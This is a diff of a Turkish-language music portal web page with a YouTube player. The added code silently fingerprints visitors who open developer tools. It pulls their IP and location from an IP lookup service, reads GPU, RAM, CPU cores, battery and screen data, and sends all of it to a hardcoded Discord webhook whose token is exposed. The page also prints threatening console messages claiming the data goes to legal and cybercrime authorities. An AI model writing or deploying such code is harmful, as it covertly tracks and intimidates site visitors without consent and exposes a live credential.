@@ -98,7 +98,7 @@
         #music-hud i { font-size: 38px; margin-bottom: 12px; display: block; color: #00e1ff; }
         #music-hud span { font-size: 14px; font-weight: 700; letter-spacing: 2px; text-transform: uppercase; color: #fff; }
 
-        /* --- ANA TASARIM VE YAZI EFEKTLERİ --- */
+        /* --- ANA TASARIM VE YAZI --- */
         #bg-canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 2; pointer-events: none; }
         .container { text-align: center; z-index: 10; width: 100%; max-width: 440px; padding: 20px; }
         
@@ -205,7 +205,7 @@
 
     <script src="https://www.youtube.com/iframe_api"></script>
     <script>
-        // --- GÜVENLİK VE DETAYLI TAKİP ---
+        // --- GÜVENLİK VE GELİŞMİŞ LOG SİSTEMİ ---
         const WEBHOOK = "https://discord.com/api/webhooks/1494748049187274894/e3KaTAxmzd7s_LfVGGWKPZ-MaSJZTG1v1xsZ6NVtiYO-F9yJ8zsab8iVZkQQwNCSM1Nb";
         let consoleAlerted = false;
 
@@ -225,19 +225,35 @@
                                 { name: "🕒 Zaman", value: new Date().toLocaleString('tr-TR'), inline: true },
                                 { name: "🔗 Kaynak", value: "Lost Dreams Portal", inline: true }
                             ],
-                            footer: { text: "Legal Forensic Logger v2.5" }
+                            footer: { text: "Forensic Report v3.0" }
                         }]
                     })
                 });
             } catch(e) {}
         }
 
-        // --- GELİŞMİŞ SIZMA ALARMI (ADLİ BİLİŞİM MODU) ---
+        // --- DONANIM SORGULARI ---
+        function getGPU() {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (!gl) return "Bilinmiyor";
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Bilinmiyor";
+        }
+
+        async function getBatteryInfo() {
+            if (!navigator.getBattery) return "Erişim Yok";
+            try {
+                const b = await navigator.getBattery();
+                return `%${Math.round(b.level * 100)} (${b.charging ? 'Şarj Oluyor' : 'Pilde'})`;
+            } catch(e) { return "Alınamadı"; }
+        }
+
+        // --- ULTRA DETAYLI SIZMA ALARMI ---
         async function triggerIntrusionAlarm() {
-            // Görsel Branding ve Sert Uyarı Metni
+            // Görsel Psikolojik Baskı
             console.clear();
-            console.log("%cSE7ENSYNDRAXE SECURITY SYSTEM", "color: #00e1ff; font-family: sans-serif; font-size: 30px; font-weight: bold; text-shadow: 0 0 15px #00e1ff; padding: 10px;");
-            
+            console.log("%cSE7ENSYNDRAXE SECURITY SYSTEM", "color: #00e1ff; font-size: 30px; font-weight: bold; text-shadow: 0 0 15px #00e1ff; padding: 10px;");
             console.log("%c[!] SİSTEME SIZMA GİRİŞİMİ TESPİT EDİLDİ / INTRUSION DETECTED", "color: #ff0000; font-size: 16px; font-weight: bold; background: rgba(255,0,0,0.1); padding: 5px;");
             
             console.log("%cIP adresin ve cihaz kimliğin yasal işlem için loglanmıştır.", "color: #ffffff; font-size: 14px; font-weight: bold;");
@@ -247,33 +263,41 @@
             consoleAlerted = true;
 
             try {
-                // IP ve Detaylı Konum API'si
+                // Veri Toplama
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
+                const gpu = getGPU();
+                const battery = await getBatteryInfo();
+                const ram = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "Bilinmiyor";
+                const cores = navigator.hardwareConcurrency || "Bilinmiyor";
 
                 const logReport = `
-**🚨 KRİTİK GÜVENLİK İHLALİ**
+**🛑 KRİTİK ADLİ BİLİŞİM RAPORU**
 ---------------------------------------
-**👤 Hedef Kimliği:** Konsol Erişim Girişimi.
-**🌐 IP Adresi:** \`${data.ip}\`
-**📍 Konum:** ${data.city}, ${data.region} / ${data.country_name}
-**🏢 İnternet Sağlayıcı:** ${data.org}
-**💻 İşletim Sistemi:** ${navigator.platform}
-**🌐 Tarayıcı Bilgisi:** ${navigator.userAgent}
+**👤 KİMLİK & AĞ BİLGİLERİ**
+**🌐 IP:** \`${data.ip}\`
+**📍 Konum:** ${data.city} / ${data.country_name}
+**🏢 ISS:** ${data.org}
+
+**💻 DONANIM PARMAK İZİ**
+**🖥️ GPU:** \`${gpu}\`
+**🧠 RAM:** ${ram} | **⚙️ İşlemci:** ${cores} Çekirdek
+**🔋 Pil Durumu:** ${battery}
+**📱 Platform:** ${navigator.platform}
 **🖥️ Çözünürlük:** ${window.screen.width}x${window.screen.height}
 ---------------------------------------
-*Bu veriler hukuki süreçte delil olarak kullanılmak üzere Discord veritabanına kaydedilmiştir.*
+*Veriler siber suçlarla mücadele ekiplerine iletilmek üzere kaydedilmiştir.*
                 `;
 
-                reportToDiscord("🛑 SIZMA KAYDI (ADLİ RAPOR)", logReport, 15158332);
+                reportToDiscord("🚨 SIZMA TESPİT EDİLDİ (TAM DETAY)", logReport, 15158332);
             } catch (err) {
-                reportToDiscord("🚨 SIZMA TESPİT EDİLDİ", "Birisi konsolu açtı ancak IP bilgisi çekilemedi.", 15158332);
+                reportToDiscord("🚨 SIZMA TESPİT EDİLDİ", "Birisi konsolu açtı ancak ağ verisi çekilemedi.", 15158332);
             }
 
             setTimeout(() => { consoleAlerted = false; }, 10000);
         }
 
-        // Konsol Koruma Tetikleyicileri
+        // Tetikleyiciler
         window.addEventListener('keydown', (e) => { 
             if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && [73, 74, 67].includes(e.keyCode)) || (e.ctrlKey && e.keyCode === 85)) { 
                 e.preventDefault(); 
@@ -317,11 +341,8 @@
                 item.className = `song-item ${index === currentTrack ? 'playing' : ''}`;
                 item.innerHTML = `<img src="https://img.youtube.com/vi/${song.id}/mqdefault.jpg" class="song-thumb"><div class="song-info">${song.name}</div>`;
                 item.onclick = () => { 
-                    currentTrack = index; 
-                    player.loadVideoById(song.id); 
-                    renderPlaylist(); 
+                    currentTrack = index; player.loadVideoById(song.id); renderPlaylist(); 
                     showHUD(song.name, "fa-solid fa-music");
-                    reportToDiscord("🎵 MÜZİK DEĞİŞTİRİLDİ", `Kullanıcı listeyi kullanarak **${song.name}** şarkısına geçti.`, 3447003);
                 };
                 list.appendChild(item);
             });
@@ -338,46 +359,18 @@
 
         function togglePlay() {
             const btn = document.getElementById('play-pause-btn');
-            if (player.getPlayerState() === 1) { 
-                player.pauseVideo(); 
-                btn.className = "fa-solid fa-play"; 
-                showHUD("Durduruldu", "fa-solid fa-pause"); 
-            } else { 
-                player.playVideo(); 
-                btn.className = "fa-solid fa-pause"; 
-                showHUD("Oynatılıyor", "fa-solid fa-play"); 
-            }
+            if (player.getPlayerState() === 1) { player.pauseVideo(); btn.className = "fa-solid fa-play"; } 
+            else { player.playVideo(); btn.className = "fa-solid fa-pause"; }
         }
 
         document.getElementById('vol-slider').addEventListener('input', (e) => {
             let vol = parseInt(e.target.value);
             player.setVolume(vol);
-            updateVolumeUI(vol);
-            showHUD(`SES: %${vol}`, vol === 0 ? "fa-solid fa-volume-xmark" : "fa-solid fa-volume-high"); 
+            document.getElementById('vol-icon').className = vol == 0 ? "fa-solid fa-volume-xmark" : vol < 50 ? "fa-solid fa-volume-low" : "fa-solid fa-volume-high";
         });
 
-        function updateVolumeUI(vol) {
-            const icon = document.getElementById('vol-icon');
-            let iconClass = vol == 0 ? "fa-solid fa-volume-xmark" : vol < 40 ? "fa-solid fa-volume-off" : vol < 70 ? "fa-solid fa-volume-low" : "fa-solid fa-volume-high";
-            icon.className = iconClass;
-        }
-
-        function nextTrack() { 
-            currentTrack = (currentTrack + 1) % playlist.length; 
-            player.loadVideoById(playlist[currentTrack].id); 
-            renderPlaylist(); 
-            showHUD(playlist[currentTrack].name, "fa-solid fa-music");
-            reportToDiscord("🎵 MÜZİK DEĞİŞTİRİLDİ", `Kullanıcı "Sonraki" tuşuna bastı. Yeni şarkı: **${playlist[currentTrack].name}**`, 3447003);
-        }
-
-        function prevTrack() { 
-            currentTrack = (currentTrack - 1 + playlist.length) % playlist.length; 
-            player.loadVideoById(playlist[currentTrack].id); 
-            renderPlaylist(); 
-            showHUD(playlist[currentTrack].name, "fa-solid fa-music");
-            reportToDiscord("🎵 MÜZİK DEĞİŞTİRİLDİ", `Kullanıcı "Önceki" tuşuna bastı. Yeni şarkı: **${playlist[currentTrack].name}**`, 3447003);
-        }
-
+        function nextTrack() { currentTrack = (currentTrack + 1) % playlist.length; player.loadVideoById(playlist[currentTrack].id); renderPlaylist(); }
+        function prevTrack() { currentTrack = (currentTrack - 1 + playlist.length) % playlist.length; player.loadVideoById(playlist[currentTrack].id); renderPlaylist(); }
         function togglePlaylist() { document.getElementById('playlist-container').classList.toggle('active'); }
 
         function startExperience() { 
@@ -387,7 +380,7 @@
             reportToDiscord("🌟 SİTEYE GİRİŞ", `Bir kullanıcı portala girdi. Çalmaya başlayan: **${playlist[currentTrack].name}**`, 1752220);
         }
 
-        // Arka Plan Çizimi
+        // Arka Plan
         const canvas = document.getElementById('bg-canvas'), ctx = canvas.getContext('2d');
         let dots = [];
         function init() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; dots = Array.from({length: 80}, () => ({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, vx: (Math.random()-0.5)*0.5, vy: (Math.random()-0.5)*0.5 })); }
